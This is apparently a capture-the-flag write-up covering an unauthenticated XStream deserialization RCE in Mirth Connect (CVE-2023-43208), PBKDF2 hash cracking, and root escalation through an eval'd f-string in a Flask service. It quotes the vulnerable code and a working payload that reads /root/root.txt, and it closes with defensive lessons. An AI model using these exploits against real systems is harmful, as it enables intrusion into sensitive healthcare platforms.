CVE-2023-43208 — Unauthenticated XStream RCE
Mirth Connect 4.4.0 · XStream deserialization · Metasploit

CVE-2023-43208 is a bypass of the earlier CVE-2023-37679 patch in Mirth Connect. The /api/users endpoint accepts unauthenticated XML POST requests and processes them through XStream, which triggers a ChainedTransformer gadget chain via Apache Commons Collections 4 to call Runtime.exec(). 04
Hash Algorithm Analysis via mirth-crypto.jar
JAR bytecode · PBKDF2WithHmacSHA256 · 600,000 iterations

The hash format isn't standard — it requires analyzing the Mirth Connect cryptography extension to determine the exact parameters. Section 05

Privilege Escalation — Python f-string Injection

06
Analyse notif.py — Flask + eval f-string
root Flask service · regex bypass · eval vulnerability

As sedric (member of the sedric group), notif.py is readable. The service listens on localhost port 54321, accepts only 127.0.0.1 connections, parses XML patient records, and passes field values through a template() function. The function applies a regex, constructs a Python string embedding user-controlled values, then calls eval(f"f'''{template}'''") — evaluating the entire string as a Python f-string.

python — notif.py (critical sections)
# Regex allows: a-z A-Z 0-9 . _ ' " ( ) { } = + /
# NOTE: {} and () and . and ' are ALL permitted
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")

def template(first, last, sender, ts, dob, gender):
    # Regex check — passes {open('/root/root.txt').read()}
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"

    # User-controlled value embedded directly in f-string template
    template = f"Patient {first} {last} ({gender}), ..."

    # THE VULNERABILITY: eval() re-evaluates the template as an f-string
    return eval(f"f'''{template}'''")   # <-- ARBITRARY CODE EXECUTION
✕
Root Cause: User input is embedded into a string which is then passed to eval(f"f'''...'''"). Any Python expression inside {} braces will be evaluated. The regex allows all characters needed: { } ( ) . ' / — enabling full Python attribute access and function calls without spaces or semicolons.
injection logic walkthrough
python — how the injection executes
# If first = "{open('/root/root.txt').read()}"
# Step 1 — f-string template construction:
template = f"Patient {first} Normal (M) ..."
# template is now literally:
"Patient {open('/root/root.txt').read()} Normal (M) ..."

# Step 2 — eval re-evaluates as f-string:

# Python evaluates open('/root/root.txt').read() as an expression
# Result: "Patient 06e2915e9d23353a3b1ee8c9481200cb\n Normal (M) ..."

# Payload passes regex because no spaces/semicolons required:
{open('/root/root.txt').read()}  # ✓ matches ^[a-zA-Z0-9._'"(){}=+/]+$

key takeaways
01 // HEALTHCARE PLATFORMS
Mirth Connect CVE-2023-43208
Healthcare integration platforms are high-value targets due to sensitive data and often-delayed patching cycles. CVE-2023-43208 is a pre-auth RCE requiring zero credentials — any internet-exposed Mirth Connect instance below 4.4.1 is fully compromised with one command. Patch immediately and place behind VPN or firewall.
02 // KDF STRENGTH VS PASSWORD
PBKDF2 600k Iterations ≠ Safe
PBKDF2 with 600,000 iterations is a very expensive hash — but it still cracked because the password snowflake1 appears in rockyou.txt. Expensive KDFs slow down cracking but don't eliminate it for weak passwords. Strong unique passwords matter regardless of how expensive the hashing algorithm is.
03 // EVAL IS DANGEROUS
Python eval() on f-strings = RCE
Passing user-controlled data through eval(f"f'''{template}'''") grants arbitrary Python code execution. There is no safe way to use eval() on user-supplied input. Use template engines with proper sandboxing (Jinja2 with SandboxedEnvironment) or simply format strings using safe interpolation methods only.
04 // REGEX ALLOWLISTS
Incomplete Character Allowlists
The regex ^[a-zA-Z0-9._'"(){}=+/]+$ looks restrictive but permits every character needed for Python function calls and attribute access. Allowlisting must be semantically correct — for patient names, the correct validation is ^[a-zA-Z\s-]+$. Never define allowlists based on "what looks safe" without considering the downstream evaluation context.
05 // LOCALHOST-ONLY SERVICES
127.0.0.1 Restriction ≠ Safe
Binding a service to localhost prevents external access but not local user access. Any user with an SSH session can interact with localhost services. Services should require authentication independent of their network binding — especially when running as a privileged user like root.
06 // CONFIG FILE SECRETS
Plaintext DB Credentials in Config
The mirth.properties file stored the database password in plaintext, readable by the mirth service user. Service configuration files containing secrets should use environment variables, secret managers, or encrypted credential stores — and should be owned by root with mode 640 at minimum.
